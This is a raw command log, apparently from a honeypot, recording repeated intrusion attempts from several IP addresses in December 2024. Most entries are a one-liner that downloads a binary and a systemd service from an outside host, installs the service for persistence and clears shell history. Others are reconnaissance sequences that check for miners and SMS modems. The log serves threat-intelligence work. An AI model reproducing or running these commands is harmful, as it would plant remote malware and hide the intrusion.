--- Start of remote_exec_dallas_07-10_12_24.log ---
start
2024-12-08 13:41:38.008428 - ('45.148.10.46', 60794) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:45.507420 - ('45.148.10.46', 43298) - apt
2024-12-08 13:41:46.110363 - ('45.148.10.46', 43298) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:41:56.413342 - ('45.148.10.46', 54538) - apt
2024-12-08 13:41:57.909084 - ('45.148.10.46', 54538) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:06.511851 - ('45.148.10.46', 49486) - apt
2024-12-08 13:42:07.715974 - ('45.148.10.46', 49486) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:15.310729 - ('45.148.10.46', 51284) - apt
2024-12-08 13:42:16.311730 - ('45.148.10.46', 51284) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:22.728063 - ('45.148.10.46', 57108) - apt
2024-12-08 13:42:23.285209 - ('45.148.10.46', 57108) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:31.508542 - ('45.148.10.46', 57122) - apt
2024-12-08 13:42:32.108777 - ('45.148.10.46', 57122) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:41.639542 - ('45.148.10.46', 36328) - apt
2024-12-08 13:42:42.710847 - ('45.148.10.46', 36328) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:51.407069 - ('45.148.10.46', 55802) - apt
2024-12-08 13:42:52.510360 - ('45.148.10.46', 55802) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:42:58.373775 - ('45.148.10.46', 55814) - apt
2024-12-08 13:42:59.138664 - ('45.148.10.46', 55814) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:06.012656 - ('45.148.10.46', 47818) - apt
2024-12-08 13:43:06.731751 - ('45.148.10.46', 47818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:15.809347 - ('45.148.10.46', 42084) - apt
2024-12-08 13:43:16.507262 - ('45.148.10.46', 42084) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:23.510385 - ('45.148.10.46', 46812) - apt
2024-12-08 13:43:24.510403 - ('45.148.10.46', 46812) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:30.386941 - ('45.148.10.46', 39798) - apt
2024-12-08 13:43:30.916914 - ('45.148.10.46', 39798) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:39.907653 - ('45.148.10.46', 39808) - apt
2024-12-08 13:43:40.507021 - ('45.148.10.46', 39808) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 13:43:48.007350 - ('45.148.10.46', 33208) - apt
2024-12-08 13:43:49.408759 - ('45.148.10.46', 33208) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 16:01:46.843496 - ('122.41.243.208', 54319) - /ip cloud print
2024-12-08 16:01:48.119590 - ('122.41.243.208', 54319) - ifconfig
2024-12-08 16:01:49.163294 - ('122.41.243.208', 54319) - uname -a
2024-12-08 16:01:50.207336 - ('122.41.243.208', 54319) - cat /proc/cpuinfo
2024-12-08 16:01:51.247484 - ('122.41.243.208', 54319) - ps | grep '[Mm]iner'
2024-12-08 16:01:52.291157 - ('122.41.243.208', 54319) - ps -ef | grep '[Mm]iner'
2024-12-08 16:01:53.331393 - ('122.41.243.208', 54319) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 16:01:54.371282 - ('122.41.243.208', 54319) - echo Hi | cat -n
2024-12-08 16:24:50.195352 - ('195.178.110.6', 50680) - apt
2024-12-08 16:24:50.708112 - ('195.178.110.6', 50680) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:14:50.897601 - ('45.148.10.203', 37736) - apt
2024-12-08 17:14:51.402707 - ('45.148.10.203', 37736) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:14:56.724667 - ('45.148.10.203', 51426) - apt
2024-12-08 17:14:57.260855 - ('45.148.10.203', 51426) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 18:58:39.048275 - ('182.223.37.51', 42829) - /ip cloud print
2024-12-08 18:58:40.275354 - ('182.223.37.51', 42829) - ifconfig
2024-12-08 18:58:41.280406 - ('182.223.37.51', 42829) - uname -a
2024-12-08 18:58:42.285050 - ('182.223.37.51', 42829) - cat /proc/cpuinfo
2024-12-08 18:58:43.289150 - ('182.223.37.51', 42829) - ps | grep '[Mm]iner'
2024-12-08 18:58:44.291637 - ('182.223.37.51', 42829) - ps -ef | grep '[Mm]iner'
2024-12-08 18:58:45.296762 - ('182.223.37.51', 42829) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 18:58:46.300506 - ('182.223.37.51', 42829) - echo Hi | cat -n
2024-12-08 21:12:07.136531 - ('124.48.113.21', 42750) - /ip cloud print
2024-12-08 21:12:08.368431 - ('124.48.113.21', 42750) - ifconfig
2024-12-08 21:12:09.372471 - ('124.48.113.21', 42750) - uname -a
2024-12-08 21:12:10.384427 - ('124.48.113.21', 42750) - cat /proc/cpuinfo
2024-12-08 21:12:11.408552 - ('124.48.113.21', 42750) - ps | grep '[Mm]iner'
2024-12-08 21:12:12.424400 - ('124.48.113.21', 42750) - ps -ef | grep '[Mm]iner'
2024-12-08 21:12:13.428314 - ('124.48.113.21', 42750) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 21:12:14.432311 - ('124.48.113.21', 42750) - echo Hi | cat -n
2024-12-08 21:18:14.032796 - ('195.178.110.6', 56248) - apt
2024-12-08 21:18:14.552662 - ('195.178.110.6', 56248) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 21:18:19.962944 - ('195.178.110.6', 39756) - apt
2024-12-08 21:18:20.489175 - ('195.178.110.6', 39756) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 22:13:29.560406 - ('180.225.59.141', 57214) - /ip cloud print
2024-12-08 22:13:30.669928 - ('180.225.59.141', 57214) - ifconfig
2024-12-08 22:13:31.629552 - ('180.225.59.141', 57214) - uname -a
2024-12-08 22:13:32.593681 - ('180.225.59.141', 57214) - cat /proc/cpuinfo
2024-12-08 22:13:33.553698 - ('180.225.59.141', 57214) - ps | grep '[Mm]iner'
2024-12-08 22:13:34.513639 - ('180.225.59.141', 57214) - ps -ef | grep '[Mm]iner'
2024-12-08 22:13:35.473531 - ('180.225.59.141', 57214) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 22:13:36.433430 - ('180.225.59.141', 57214) - echo Hi | cat -n
2024-12-08 23:09:57.458935 - ('180.227.176.237', 38343) - /ip cloud print
2024-12-08 23:09:58.635382 - ('180.227.176.237', 38343) - ifconfig
2024-12-08 23:09:59.599841 - ('180.227.176.237', 38343) - uname -a
2024-12-08 23:10:00.567399 - ('180.227.176.237', 38343) - cat /proc/cpuinfo
2024-12-08 23:10:01.538924 - ('180.227.176.237', 38343) - ps | grep '[Mm]iner'
2024-12-08 23:10:02.502686 - ('180.227.176.237', 38343) - ps -ef | grep '[Mm]iner'
2024-12-08 23:10:03.463208 - ('180.227.176.237', 38343) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 23:10:04.427695 - ('180.227.176.237', 38343) - echo Hi | cat -n
2024-12-08 23:13:57.263309 - ('119.68.39.90', 50157) - /ip cloud print
2024-12-08 23:13:58.463398 - ('119.68.39.90', 50157) - ifconfig
2024-12-08 23:13:59.443191 - ('119.68.39.90', 50157) - uname -a
2024-12-08 23:14:00.423122 - ('119.68.39.90', 50157) - cat /proc/cpuinfo
2024-12-08 23:14:01.402960 - ('119.68.39.90', 50157) - ps | grep '[Mm]iner'
2024-12-08 23:14:02.382940 - ('119.68.39.90', 50157) - ps -ef | grep '[Mm]iner'
2024-12-08 23:14:03.363096 - ('119.68.39.90', 50157) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 23:14:04.342877 - ('119.68.39.90', 50157) - echo Hi | cat -n
2024-12-08 23:17:46.575272 - ('182.223.255.206', 48040) - /ip cloud print
2024-12-08 23:17:47.915475 - ('182.223.255.206', 48040) - ifconfig
2024-12-08 23:17:48.939332 - ('182.223.255.206', 48040) - uname -a
2024-12-08 23:17:50.015310 - ('182.223.255.206', 48040) - cat /proc/cpuinfo
2024-12-08 23:17:51.035208 - ('182.223.255.206', 48040) - ps | grep '[Mm]iner'
2024-12-08 23:17:52.055100 - ('182.223.255.206', 48040) - ps -ef | grep '[Mm]iner'
2024-12-08 23:17:53.075058 - ('182.223.255.206', 48040) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 23:17:54.095034 - ('182.223.255.206', 48040) - echo Hi | cat -n
2024-12-08 23:43:06.209712 - ('45.148.10.203', 45076) - apt
2024-12-08 23:43:06.747811 - ('45.148.10.203', 45076) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 23:43:12.163669 - ('45.148.10.203', 45084) - apt
2024-12-08 23:43:12.672749 - ('45.148.10.203', 45084) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 23:43:17.987910 - ('45.148.10.203', 44438) - apt
2024-12-08 23:43:18.528071 - ('45.148.10.203', 44438) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 23:43:23.960558 - ('45.148.10.203', 44442) - apt
2024-12-08 23:43:24.616423 - ('45.148.10.203', 44442) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 23:43:30.037163 - ('45.148.10.203', 57900) - apt
2024-12-08 23:43:30.566126 - ('45.148.10.203', 57900) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 04:04:06.511261 - ('124.52.207.165', 36805) - /ip cloud print
2024-12-09 04:04:07.711170 - ('124.52.207.165', 36805) - ifconfig
2024-12-09 04:04:08.691124 - ('124.52.207.165', 36805) - uname -a
2024-12-09 04:04:09.671082 - ('124.52.207.165', 36805) - cat /proc/cpuinfo
2024-12-09 04:04:10.654919 - ('124.52.207.165', 36805) - ps | grep '[Mm]iner'
2024-12-09 04:04:11.635017 - ('124.52.207.165', 36805) - ps -ef | grep '[Mm]iner'
2024-12-09 04:04:12.615072 - ('124.52.207.165', 36805) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 04:04:13.594861 - ('124.52.207.165', 36805) - echo Hi | cat -n
2024-12-09 04:42:21.442920 - ('45.148.10.203', 59352) - apt
2024-12-09 04:42:21.971505 - ('45.148.10.203', 59352) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 04:42:27.302061 - ('45.148.10.203', 34032) - apt
2024-12-09 04:42:27.826813 - ('45.148.10.203', 34032) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 04:42:33.130781 - ('45.148.10.203', 34042) - apt
2024-12-09 04:42:33.660153 - ('45.148.10.203', 34042) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
